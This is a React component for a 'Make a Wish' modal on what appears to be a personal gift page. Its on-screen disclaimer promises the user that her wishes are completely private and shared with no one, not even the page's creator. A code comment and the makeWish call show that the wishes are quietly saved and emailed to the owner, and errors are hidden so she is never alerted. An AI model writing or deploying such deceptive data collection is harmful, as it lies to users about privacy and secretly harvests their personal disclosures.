import { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { makeWish } from '../api/client.js';

export default function WishModal({ onClose, onGranted }) {
  const [wishes, setWishes] = useState(['']);
  const [sending, setSending] = useState(false);
  const [granted, setGranted] = useState(false);

  const setAt = (i, v) => setWishes((w) => w.map((x, idx) => (idx === i ? v : x)));
  const addWish = () => setWishes((w) => [...w, '']);

  const submit = async () => {
    const cleaned = wishes.map((w) => w.trim()).filter(Boolean);
    if (cleaned.length === 0) return;
    setSending(true);
    try {
      // She's told this is private. It quietly saves + emails the owner.
      await makeWish(cleaned);
    } catch {
      /* even on failure, keep the magic — never alarm her */
    }
    setGranted(true);
    setTimeout(() => onGranted?.(), 2200);
  };

  return (
    <AnimatePresence>
      <motion.div
        className="wish-backdrop"
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        onClick={(e) => e.target === e.currentTarget && !sending && onClose?.()}
      >
        <motion.div
          className="wish-card"
          initial={{ scale: 0.85, y: 30, opacity: 0 }}
          animate={{ scale: 1, y: 0, opacity: 1 }}
          transition={{ type: 'spring', stiffness: 160, damping: 18 }}
        >
          {granted ? (
            <div className="wish-granted">
              ✨ Your wish has been carried into the dark ✨
              <p style={{ fontFamily: 'var(--hand)', fontSize: '1.4rem', color: '#d9b9c7' }}>
                Now step inside her world…
              </p>
            </div>
          ) : (
            <>
              <h2>Make a Wish</h2>
              <p style={{ textAlign: 'center', color: '#d9b9c7', marginTop: '-0.4rem' }}>
                Close your eyes. Whisper what your heart wants tonight.
              </p>

              {wishes.map((w, i) => (
                <textarea
                  key={i}
                  className="wish-input"
                  rows={2}
                  placeholder={i === 0 ? 'I wish…' : 'And I also wish…'}
                  value={w}
                  onChange={(e) => setAt(i, e.target.value)}
                />
              ))}

              <button className="wish-add" onClick={addWish} type="button">
                ✚ add another wish
              </button>

              <p className="wish-disclaimer">
                Your wishes are completely private. They will never be shared with
                anyone — not even the creator of this page. This is just between you
                and the universe. 🌙
              </p>

              <button className="wish-submit" onClick={submit} disabled={sending}>
                {sending ? 'sending into the night…' : 'Blow the candles & wish'}
              </button>
            </>
          )}
        </motion.div>
      </motion.div>
    </AnimatePresence>
  );
}
